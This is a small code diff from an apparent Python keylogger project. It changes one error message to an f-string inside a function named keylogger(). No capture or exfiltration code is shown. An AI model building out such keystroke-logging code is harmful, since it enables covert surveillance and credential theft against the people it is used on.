@@ -47,7 +47,7 @@ def keylogger():
         
         except PermissionError:
             # Handle the case where there are permission issues
-            print("Error: Permission denied while accessing the file.")
+            print(f"Error: Permission denied while accessing the file.")
         
         finally:
             # Attempt to close the file safely
